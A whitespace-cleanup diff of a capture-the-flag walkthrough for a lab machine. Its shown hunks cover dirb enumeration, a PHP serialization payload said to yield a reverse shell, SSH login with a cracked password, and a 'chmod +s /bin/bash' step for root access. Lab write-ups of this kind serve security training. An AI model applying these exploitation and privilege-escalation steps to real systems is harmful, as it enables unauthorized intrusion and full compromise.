@@ -31,7 +31,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.28 seconds
 kali@kali:dirb http://10.49.176.116/
 
 -----------------
-DIRB v2.22    
+DIRB v2.22
 By The Dark Raver
 -----------------
 
@@ -41,33 +41,33 @@ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 -----------------
 
-GENERATED WORDS: 4612                                                          
+GENERATED WORDS: 4612
 
 ---- Scanning URL: http://10.49.176.116/ ----
-==> DIRECTORY: http://10.49.176.116/backup/                                                                                                            
-==> DIRECTORY: http://10.49.176.116/grid/                                                                                                              
-+ http://10.49.176.116/index.html (CODE:200|SIZE:11321)                                                                                                
-+ http://10.49.176.116/index.php (CODE:200|SIZE:5732)                                                                                                  
-==> DIRECTORY: http://10.49.176.116/javascript/                                                                                                        
-==> DIRECTORY: http://10.49.176.116/javascripts/                                                                                                       
-+ http://10.49.176.116/server-status (CODE:403|SIZE:278)                                                                                               
-                                                                                                                                                       
+==> DIRECTORY: http://10.49.176.116/backup/
+==> DIRECTORY: http://10.49.176.116/grid/
++ http://10.49.176.116/index.html (CODE:200|SIZE:11321)
++ http://10.49.176.116/index.php (CODE:200|SIZE:5732)
+==> DIRECTORY: http://10.49.176.116/javascript/
+==> DIRECTORY: http://10.49.176.116/javascripts/
++ http://10.49.176.116/server-status (CODE:403|SIZE:278)
+
 ---- Entering directory: http://10.49.176.116/backup/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                       
+
 ---- Entering directory: http://10.49.176.116/grid/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                       
+
 ---- Entering directory: http://10.49.176.116/javascript/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
-                                                                                                                                                       
+
 ---- Entering directory: http://10.49.176.116/javascripts/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
-                                                                               
+
 -----------------
 END_TIME: Mon Feb 16 14:22:57 2026
 DOWNLOADED: 4612 - FOUND: 3
@@ -104,7 +104,7 @@ print urlencode(serialize(new FormSubmit));
 We will create a reverse shell payload from this.
 
 ```bash
-kali@kali:php exploit.php                                                                                                                                     
+kali@kali:php exploit.php
 O%3A10%3A%22For......%3B%7D
 ```
 
@@ -160,7 +160,7 @@ Session completed.
 Now, we have a pass for user james, now we can ssh for a proper tty.
 
 ```bash
-kali@kali:ssh james@10.49.176.116                                                                                                                             
+kali@kali:ssh james@10.49.176.116
 The authenticity of host '10.49.176.116 (10.49.176.116)' can't be established.
 ED25519 key fingerprint is: SHA256:j1rsa6H3aWAH+1ivgTwsdNPBDEJU72p3MUWbcL70JII
 This key is not known by any other names.
@@ -169,7 +169,7 @@ Warning: Permanently added '10.49.176.116' (ED25519) to the list of known hosts.
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
-james@10.49.176.116's password: 
+james@10.49.176.116's password:
 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -267,11 +267,11 @@ chmod +s /bin/bash
 We are basically making /bin/bash SUID, so that we can be root. Exit and relogin via ssh.
 
 ```bash
-kali@kali:ssh james@10.49.176.116                                                                                                                             
+kali@kali:ssh james@10.49.176.116
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
-james@10.49.176.116's password: 
+james@10.49.176.116's password:
 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
